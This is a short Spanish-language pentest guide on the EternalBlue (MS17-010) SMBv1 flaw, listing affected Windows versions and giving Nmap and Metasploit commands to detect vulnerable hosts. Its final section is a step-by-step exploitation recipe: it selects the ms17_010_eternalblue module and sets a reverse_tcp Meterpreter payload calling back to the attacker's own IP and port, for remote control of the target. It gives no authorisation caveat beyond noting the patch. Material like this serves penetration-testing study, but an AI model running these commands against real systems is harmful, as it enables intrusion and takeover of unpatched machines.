# EternalBlue (MS17-010)

## 1. ¿Qué es EternalBlue?

- EternalBlue es un exploit desarrollado por la NSA y filtrado en 2017.
- Aprovecha una vulnerabilidad crítica en el protocolo **SMBv1** de Windows para ejecución remota de código.
- Permitió ataques masivos como **WannaCry** y **NotPetya**.

---

## 2. Versiones de Windows afectadas

- Windows Vista (32-bit y 64-bit)
- Windows 7 (32-bit y 64-bit)
- Windows Server 2008 y 2008 R2
- Windows 8.1 (algunas versiones)
- Windows Server 2012
- Windows 10 (versiones iniciales sin parches)
  
**Nota:**  
- Las versiones modernas con SMBv1 deshabilitado o con los parches aplicados no son vulnerables.
- Microsoft lanzó el parche **MS17-010** para corregir esta vulnerabilidad.

---

## 3. Cómo identificar si un sistema es vulnerable

### a) Usar Nmap con script específico

```bash
nmap -p 445 --script smb-vuln-ms17-010 <IP_objetivo>
```

El script devuelve si el host es vulnerable o no.

### b) Usar Metasploit para escanear

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP_objetivo>
run
```

Esto también indica si el sistema es vulnerable.

---

## 4. Cómo usar el exploit EternalBlue en Metasploit

### a) Iniciar msfconsole

```bash
msfconsole
```

### b) Seleccionar módulo exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### c) Configurar opciones básicas

```bash
set RHOSTS <IP_objetivo>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
```

### d) Ejecutar el exploit

```bash
run
```

Si es exitoso, obtendrás una sesión Meterpreter con control remoto.

---

